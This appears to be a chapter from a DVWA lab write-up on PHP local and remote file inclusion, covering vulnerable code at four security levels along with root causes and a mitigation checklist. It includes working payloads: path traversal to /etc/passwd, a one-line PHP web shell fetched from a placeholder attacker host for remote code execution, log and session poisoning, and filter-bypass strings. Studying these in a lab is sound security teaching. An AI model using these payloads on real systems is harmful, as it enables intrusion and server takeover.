# 04 — File Inclusion (LFI/RFI)

## What the feature does
A page selector that `include()`s a PHP file based on a `page` query parameter (e.g. switching between `file1.php`, `file2.php`, `file3.php`).

---

## LOW

```php
$file = $_GET[ 'page' ];
include( $file );
```

**Exploitation — Local File Inclusion (LFI):**

```
?page=../../../../../../etc/passwd
```

If `allow_url_include` is enabled server-side, this escalates to **Remote File Inclusion (RFI) → RCE**:

```bash
# Attacker hosts a malicious PHP file
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 8000
```
```
?page=http://<attacker_ip>:8000/shell.php&cmd=id
```

**LFI → RCE without RFI, via log/session poisoning:**
```
# Poison Apache access log with PHP code in the User-Agent header (via Burp)
User-Agent: <?php system($_GET['cmd']); ?>
# Then include the log:
?page=../../../../var/log/apache2/access.log&cmd=id
```

Or via **PHP session file inclusion** — inject PHP into a session variable (e.g. DVWA's own login page sets `$_SESSION['username']`), then include `../../../../var/lib/php/sessions/sess_<PHPSESSID>`.

**Why it works:** `include()` in PHP will execute *any* file it's given as PHP code if it can, and follow path traversal sequences (`../`) or remote URLs (if `allow_url_include=On`) with zero restriction.

---

## MEDIUM

```php
$file = str_replace( [ 'http://', 'https://' ], '', $_GET[ 'page' ] );
$file = str_replace( [ '../', '..\\' ], '', $file );
```

**Why it's still bypassable:** Classic **single-pass, non-recursive filter bypass**. `str_replace` removes `../` once — but doesn't re-scan the result. Feed it an overlapping/nested pattern:

```
....//....//....//....//etc/passwd
```
Removing `../` from `....//` leaves `../` behind (`....//` minus `../` in the middle = `../`), reconstructing the traversal sequence. Also, `http://` stripping doesn't stop `HTTP://` (case) or `hthttp://tp://` (nested) on some naive implementations, and doesn't stop other wrappers like `php://filter/convert.base64-encode/resource=index.php` (useful for **source disclosure** even when RCE is blocked).

**Root issue:** Blocklist-and-strip approach applied once, not recursively, and not blocking dangerous PHP stream wrappers (`php://`, `data://`, `expect://`, `zip://`).

---

## HIGH

```php
$file = $_GET[ 'page' ];
if ( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    // reject
} else {
    include($file);
}
```

**Why it's still (theoretically) bypassable:** This enforces that the filename must **start with** `"file"`. This blocks path traversal to arbitrary system files. But it's still an allowlist implemented sloppily — `fnmatch("file*", $file)` matches anything starting with the literal string `file`, including local subdirectory tricks in edge cases, or (historically, in older PHP versions) certain wrapper/null-byte tricks. In practice High is very strong against remote attackers and mainly closes off arbitrary-path traversal — the main residual risk is if an attacker can get a file *named* `fileXXX` written somewhere on disk (e.g. via the File Upload module — see chapter 05) and then include it via a crafted relative path, chaining two vulnerabilities together.

**Root issue:** Prefix-matching an allowlist is much safer than denylisting, but still isn't a hard directory/extension lock — chaining with other bugs (upload, log poisoning under a `file`-prefixed name) is the realistic residual risk.

---

## IMPOSSIBLE

```php
$file = $_GET[ 'page' ];
switch ( $file ) {
    case "include.php":
        break;
    default:
        include( "include.php" );
        exit;
}
include( $file );
```

**Why this is actually secure:** This is a **strict allowlist against a fixed set of known values** (`switch`/`case` against literal, hardcoded filenames) rather than pattern matching against user input. There is no path the user controls that reaches `include()` with attacker-influenced content — the input either exactly matches one of a small number of hardcoded safe strings, or it's rejected outright. No traversal, no wrapper, no injected filename can ever be evaluated.

---

## Root Cause Summary
> Never pass user input into a file-inclusion/require function, even after "sanitizing" it. If the set of valid pages is small and known, use a hardcoded allowlist (switch/case or a lookup map) — not pattern matching against attacker-controlled strings.

## Real-World Parallels
- CVE-2021-41773 (Apache path traversal → RCE)
- Countless WordPress plugin LFI/RFI CVEs (`?template=`, `?page=` parameters)
- OWASP Top 10: **A03:2021 – Injection** / **A05:2021 – Security Misconfiguration** (`allow_url_include`)

## Mitigation Checklist
- [ ] Never build include/require paths from user input
- [ ] Use a hardcoded map/allowlist of valid page identifiers → file paths
- [ ] `allow_url_fopen` / `allow_url_include` disabled in `php.ini`
- [ ] Principle of least privilege on the web server user (can't read `/etc/passwd`, `/var/log`, etc.)
- [ ] Disable dangerous PHP stream wrappers if not needed
